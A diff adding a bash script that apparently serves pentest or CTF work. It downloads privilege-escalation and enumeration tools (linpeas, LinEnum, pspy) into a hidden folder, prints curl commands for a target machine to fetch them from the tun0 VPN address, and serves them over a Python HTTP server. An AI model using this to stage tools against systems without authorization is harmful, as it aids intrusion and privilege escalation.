@@ -1,0 +1,49 @@
+#!/bin/bash
+
+# Create the folder if it doesn't exist
+mkdir -p ~/.HostingFolder
+
+# Function to download file if it doesn't exist or is newer
+download_if_needed() {
+    local url="$1"
+    local file="$2"
+
+    if [ ! -f "$file" ]; then
+        wget -O "$file" "$url"
+    fi
+}
+
+# Download files only if they don't exist or are newer
+download_if_needed "https://github.com/pentestfunctions/escalation-folder/blob/main/subf.sh" ~/.HostingFolder/subf.sh
+download_if_needed "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" ~/.HostingFolder/linpeas.sh
+download_if_needed "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" ~/.HostingFolder/LinEnum.sh
+download_if_needed "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32" ~/.HostingFolder/pspy32
+download_if_needed "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64" ~/.HostingFolder/pspy64
+
+# Optional: Make the downloaded scripts executable
+chmod +x ~/.HostingFolder/*.sh
+chmod +x ~/.HostingFolder/pspy32 ~/.HostingFolder/pspy64
+
+echo "Files downloaded to ~/.HostingFolder"
+
+clear
+
+# Check if tun0 IP is found
+tun0_ip=$(/sbin/ifconfig tun0 | awk '/inet / {print $2}')
+
+# Print out curl command for each file in ~/.HostingFolder
+echo "========================================" | lolcat
+for file in ~/.HostingFolder/*; do
+    if [ -f "$file" ]; then
+        echo "curl http://$tun0_ip:8080/$(basename "$file")"  | lolcat
+    fi
+done
+echo "========================================" | lolcat
+
+if [ -n "$tun0_ip" ]; then
+    # If tun0 IP is found, print the IP address and start the Python HTTP server
+    echo "Hosting on: $tun0_ip" | lolcat
+    python -m http.server --bind $tun0_ip 8080 2>/dev/null
+else
+    echo "tun0 IP not found."
+fi
